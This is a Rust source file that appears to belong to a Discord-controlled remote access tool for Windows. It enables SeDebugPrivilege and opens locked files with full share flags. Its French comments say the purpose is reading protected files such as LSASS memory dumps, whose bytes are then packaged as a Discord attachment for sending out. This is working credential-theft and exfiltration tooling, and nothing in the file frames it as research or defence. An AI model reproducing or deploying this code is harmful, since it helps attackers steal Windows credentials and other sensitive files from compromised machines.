//! File upload module
//!
//! Reads a file from the local filesystem and sends it as a Discord attachment.

use std::fs::OpenOptions;
use std::io::Read;
use std::os::windows::fs::OpenOptionsExt;
use std::path::Path;
use std::ptr;

use winapi::um::handleapi::CloseHandle;
use winapi::um::processthreadsapi::{GetCurrentProcess, OpenProcessToken};
use winapi::um::securitybaseapi::AdjustTokenPrivileges;
use winapi::um::winbase::LookupPrivilegeValueA;
use winapi::um::winnt::{
    HANDLE, SE_DEBUG_NAME, SE_PRIVILEGE_ENABLED, TOKEN_ADJUST_PRIVILEGES, TOKEN_PRIVILEGES,
    TOKEN_QUERY,
};

/// Active SeDebugPrivilege sur le process courant
/// Nécessaire pour lire les fichiers protégés (dumps LSASS, etc.)
fn enable_se_debug_privilege() -> Result<(), String> {
    unsafe {
        let mut token: HANDLE = ptr::null_mut();

        if OpenProcessToken(
            GetCurrentProcess(),
            TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,
            &mut token,
        ) == 0
        {
            return Err("OpenProcessToken failed".to_string());
        }

        let mut tp: TOKEN_PRIVILEGES = std::mem::zeroed();
        tp.PrivilegeCount = 1;
        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

        if LookupPrivilegeValueA(
            ptr::null(),
            SE_DEBUG_NAME.as_ptr() as *const i8,
            &mut tp.Privileges[0].Luid,
        ) == 0
        {
            CloseHandle(token);
            return Err("LookupPrivilegeValue failed".to_string());
        }

        let result = AdjustTokenPrivileges(token, 0, &mut tp, 0, ptr::null_mut(), ptr::null_mut());
        CloseHandle(token);

        if result == 0 {
            return Err("AdjustTokenPrivileges failed".to_string());
        }

        Ok(())
    }
}

/// Read a file from disk and return the raw bytes
/// Enables SeDebugPrivilege and uses share flags for locked/protected files
pub fn read_file_bytes(file_path: &str) -> Result<(Vec<u8>, String), String> {
    // Activer SeDebugPrivilege pour pouvoir lire les fichiers protégés (ex: lsass.dmp)
    let _ = enable_se_debug_privilege();

    let path = Path::new(file_path);

    // Vérifier que le fichier existe
    if !path.exists() {
        return Err(format!("File not found: {}", file_path));
    }

    // Vérifier que c'est bien un fichier (pas un dossier)
    if !path.is_file() {
        return Err(format!("Not a file: {}", file_path));
    }

    // Ouvrir avec FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE
    // pour pouvoir lire les fichiers lockés par un autre process (ex: .dmp)
    let mut file = OpenOptions::new()
        .read(true)
        .share_mode(0x00000001 | 0x00000002 | 0x00000004)
        .open(path)
        .map_err(|e| format!("Failed to open file: {}", e))?;

    let mut data = Vec::new();
    file.read_to_end(&mut data)
        .map_err(|e| format!("Failed to read file: {}", e))?;

    // Extraire le nom du fichier pour l'attachment Discord
    let filename = path
        .file_name()
        .and_then(|n| n.to_str())
        .unwrap_or("upload.bin")
        .to_string();

    Ok((data, filename))
}
